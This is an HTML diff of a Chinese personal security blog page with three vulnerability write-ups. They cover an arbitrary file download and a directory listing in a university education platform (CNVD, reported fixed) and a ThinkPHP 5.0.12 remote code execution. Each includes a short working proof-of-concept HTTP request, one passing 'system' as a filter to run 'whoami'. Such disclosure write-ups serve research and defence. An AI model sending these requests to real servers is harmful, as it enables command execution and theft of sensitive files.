@@ -6,7 +6,7 @@
   <title>Personal Blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   
-    <link rel="shortcut icon" href="../../../favicon.png">
+    <link rel="shortcut icon" href="../../../img/avatar/avatar.jpg">
   
   
 <link rel="stylesheet" href="../../../css/style.css">
@@ -78,17 +78,19 @@
       
         <p>某平台任意文件下载，攻击者可利用该漏洞下载系统敏感信息，影响范围涉及全国大部分高校，现已修复。</p>
 <p><img src="/img/blog_img/cnvd/cnvd_01.png" alt=""></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/theorytest/teacher/Exammanage.class</code></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/theorytest/teacher/Exammanage.class</code></p>
 <p><code>down</code> 方法，路由是 <code>/teacher/resourcemanager/exam/exammanage/down.do</code></p>
-<p><img src="/img/blog_img/cnvd/cnvd_02.png" style="zoom:50%;" /></p>
+<img src="/img/blog_img/cnvd/cnvd_02.png" style="zoom:50%;" />
 <p>获取 <code>path</code> 参数，拼接成 <code>realPath</code> ,然后用输出流写出文件。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>POC</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>POC</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/teacher/resourcemanager/exam/exammanage/down.do?path=xxxx（文件路径）</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://richael-y.github.io/blogs/CNVD-2023-3**48/" data-id="cmqt6oe9l0003pnobdik99n2b" data-title="CNVD-2023-3**48" class="article-share-link">Share</a>
+      <a data-url="https://richael-y.github.io/blogs/CNVD-2023-3**48/" data-id="cmqtbdlz30003wwob50np4xq8" data-title="CNVD-2023-3**48" class="article-share-link">Share</a>
       
       
       
@@ -130,19 +132,21 @@
       
         <p>某平台系统存在任意目录遍历漏洞，攻击者可利用该漏洞读取系统敏感信息，影响范围涉及全国大部分高校，现已修复。</p>
 <p><img src="/img/blog_img/cnvd/cnvd_05.png" alt=""></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/common/Uploader.class</code></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/common/Uploader.class</code></p>
 <p>路由是 <code>/common/getDrive.do</code></p>
-<p><img src="/img/blog_img/cnvd/cnvd_06.png" style="zoom:50%;" /></p>
+<img src="/img/blog_img/cnvd/cnvd_06.png" style="zoom:50%;" />
 <p>前面两个 if判断都是在 <code>type</code> 为 <code>library</code> 的时候进入，我们这里传入的是 <code>type=drives</code> ，直接进入到第三个 if语句；</p>
 <p>调用 <code>File.listFiles</code> ，直接列出对应文件下的文件，然后放入到 <code>map</code> 中返回。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>POC</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>POC</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/common/getDrive.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line">path=C%3A%5C（可继续加路由）&amp;type=drives&amp;extensions=</span><br></pre></td></tr></table></figure>
-<p><img src="/img/blog_img/cnvd/cnvd_07.png" style="zoom:50%;" /></p>
+<img src="/img/blog_img/cnvd/cnvd_07.png" style="zoom:50%;" />
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://richael-y.github.io/blogs/CNVD-2023-3**63/" data-id="cmqt6oe9o0007pnobenza7m8x" data-title="CNVD-2023-3**63" class="article-share-link">Share</a>
+      <a data-url="https://richael-y.github.io/blogs/CNVD-2023-3**63/" data-id="cmqtbdlze0007wwob69a07xoe" data-title="CNVD-2023-3**63" class="article-share-link">Share</a>
       
       
       
@@ -183,46 +187,51 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>有很多网站采用的是ThinkPHP V5.0.12框架，其核心类Requests对变量属性校验不严，可以通过变量覆盖属性并结合框架特性对任意函数调用，实现任意代码执行。</p>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="代码流程"><a href="#代码流程" class="headerlink" title="代码流程"></a>代码流程</h4><p>首先在开启debug的时候会直接在下面的箭头处触发RCE，这里先关掉debug。</p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<h4 id="代码流程">代码流程</h4>
+<p>首先在开启debug的时候会直接在下面的箭头处触发RCE，这里先关掉debug。</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_01.png" alt=""></p>
 <p>跟进routeCheck()</p>
 <p>这里会调用Route类的check方法：</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_02.png" alt=""></p>
 <p>继续跟进check方法</p>
 <p>这里会调用Request类的method方法：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_03.png" style="zoom:75%;" /></p>
+<img src="/img/blog_img/tp5/tp5.0.12_03.png" style="zoom:75%;" />
 <p>跟进method方法</p>
 <p>POST可以接收_method参数。根据接收到的参数值调用方法的核心漏洞点就在此：由于没有对参数进行严格限制，可以调用_construct，初始化filter变量。</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_04.png" style="zoom:75%;" /></p>
+<img src="/img/blog_img/tp5/tp5.0.12_04.png" style="zoom:75%;" />
 <p>继续跟进_construct方法</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_05.png" alt=""></p>
 <p>但此处只是设置了filter值，还需要进一步调用。</p>
 <p>最终导致RCE的位置在filterValue中：</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_06.png" alt=""></p>
 <p>此方法被input()调用，input()又被多个方法进一步调用：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_07.png" style="zoom:75%;" /></p>
+<img src="/img/blog_img/tp5/tp5.0.12_07.png" style="zoom:75%;" />
 <p>若开启debug，1处可以直接触发RCE：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_08.png" style="zoom:75%;" /></p>
+<img src="/img/blog_img/tp5/tp5.0.12_08.png" style="zoom:75%;" />
 <p>未开启debug时，需要进一步跟进exec()。</p>
 <p>此方法中调用了module方法：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_09.png" style="zoom:50%;" /></p>
+<img src="/img/blog_img/tp5/tp5.0.12_09.png" style="zoom:50%;" />
 <p>module方法中会加载控制器：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_10.png" style="zoom:75%;" /></p>
+<img src="/img/blog_img/tp5/tp5.0.12_10.png" style="zoom:75%;" />
 <p>controller会反射一个类：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_11.png" style="zoom:75%;" /></p>
+<img src="/img/blog_img/tp5/tp5.0.12_11.png" style="zoom:75%;" />
 <p>invokeClass()调用bindParams方法：</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_12.png" alt=""></p>
 <p>最终调用param()触发RCE：</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_13.png" alt=""></p>
 <p>调用堆栈</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_14.png" alt=""></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line">s=whoami&amp;_method=_construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">system</span></span></span><br></pre></td></tr></table></figure>
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><img src="/img/blog_img/tp5/tp5.0.12_15.png" style="zoom:50%;" /></p>
+<h3 id="漏洞复现">漏洞复现</h3>
+<h4 id="POC">POC</h4>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line">s=whoami&amp;_method=_construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">system</span></span></span><br></pre></td></tr></table></figure>
+<h4 id="利用">利用</h4>
+<img src="/img/blog_img/tp5/tp5.0.12_15.png" style="zoom:50%;" />
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://richael-y.github.io/blogs/TP5-0-12-RCE/" data-id="cmqt6oe9y000ppnobe7p2d82v" data-title="ThinkPHP V5.0.12 RCE" class="article-share-link">Share</a>
+      <a data-url="https://richael-y.github.io/blogs/TP5-0-12-RCE/" data-id="cmqtbdm00000pwwobac8k6b5g" data-title="ThinkPHP V5.0.12 RCE" class="article-share-link">Share</a>
       
       
       
@@ -340,5 +349,20 @@
 
 
   </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
